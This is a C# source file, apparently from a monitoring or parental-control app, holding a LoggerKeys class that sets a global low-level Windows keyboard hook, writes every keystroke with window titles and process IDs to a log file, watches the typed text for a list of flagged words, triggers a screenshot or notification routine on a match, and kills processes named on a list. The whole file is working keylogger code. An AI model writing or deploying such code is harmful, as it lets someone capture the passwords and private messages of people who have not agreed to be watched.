using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using TaskManager;

namespace WpfApp15.ViewModel
{
    public static class ListExtra
    {
        public static void Resize<T>(this List<T> list, int sz, T c)
        {

            int cur = list.Count;
            if (sz < cur)
                list.RemoveRange(sz, cur - sz);
            else if (sz > cur)
            {
                if (sz > list.Capacity)//this bit is purely an optimisation, to avoid multiple automatic capacity changes.
                    list.Capacity = sz;
                list.AddRange(Enumerable.Repeat(c, sz - cur));
            }
        }
        public static void Resize<T>(this List<T> list, int sz) where T : new()
        {
            Resize(list, sz, new T());
        }
    }
    public static class LoggerKeys
    {
        public static MainViewModel MainViewModel { get; set; }
        public static List<char>BufferWord;
        public static bool IsSingleInstance=false;
        public static void StartLogging(string log, MainViewModel mainViewModel)
        {          
            if (!IsSingleInstance)
            {
                BufferWord = new List<char>();
                loggerPath = log;
                _hookID = SetHook(_proc);
                MainViewModel = mainViewModel;
                IsSingleInstance = true;
                Application.Run();
            }

        }

        public static string loggerPath;
        private static string CurrentActiveWindowTitle;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }
        
        private static int? GetMaxLength(IEnumerable<string> mas)
        {
            return mas.OrderByDescending(e => e.Length).AsParallel().First().Length;
        }
        private  static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                {
                    currentKey = "[" + (Keys)vkCode + "]";
                }
                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]";
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;
                    }
                }
                TaskManager.ViewModel._trend++;
                if (TaskManager.ViewModel.writefile)
                {
                    using (StreamWriter sw = new StreamWriter(loggerPath, true))
                    {
                        try
                        {
                            int? length = GetMaxLength(ViewModelProc.BedWords) - 1;
                            BufferWord.Reverse();
                            BufferWord.Resize(length.Value);
                            BufferWord.Reverse();
                            BufferWord.Add((char)vkCode);
                            string str = null;
                            foreach (var el in BufferWord)
                            {
                                str += el.ToString();
                            }
                            foreach (var el in ViewModelProc.BedWords)
                            {
                                if (str.Contains(el))
                                {
                                    Task.Run(() => ScreenShot.sendNotificationKeyWord(loggerPath, str));
                                    
                                    MainViewModel.UpdateEventLog($"{str} is Founded!", $"{DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                                    sw.WriteLineAsync($"###  {str} is Founded!!!" + $"  {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}  ###");
                                }

                            }
                        }


                        catch (Exception)
                        { }
                        if (CurrentActiveWindowTitle == GetActiveWindowTitle().Item1)
                        {
                            sw.WriteAsync(currentKey);
                        }
                        else
                        {
                            sw.WriteLineAsync(Environment.NewLine);
                            (string, Process) Titleproc = GetActiveWindowTitle();

                            sw.WriteLineAsync($"###  {Titleproc.Item1}" + $"  {Titleproc.Item2.Id}" + $"  {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}  ###");
                            MainViewModel.UpdateEventLog($"Start process: {Titleproc.Item1}, id={ Titleproc.Item2.Id}", $"{DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                            sw.WriteLineAsync(currentKey);
                            Task.Run(() =>
                            {
                                if (ViewModelProc.queryable(ViewModelProc.ProgramsList, Titleproc.Item2.ProcessName).ToArray().Length > 0)
                                {
                                    Titleproc.Item2.Kill();
                                }
                            });
                        }
                    }
                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static (string,Process) GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                //Task.Run(() => ViewModelProc.AddProc(p));
                return (title,p) ;
            }
            catch (Exception)
            {
                return ("???",null);
            }
        }


        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion

    }

}

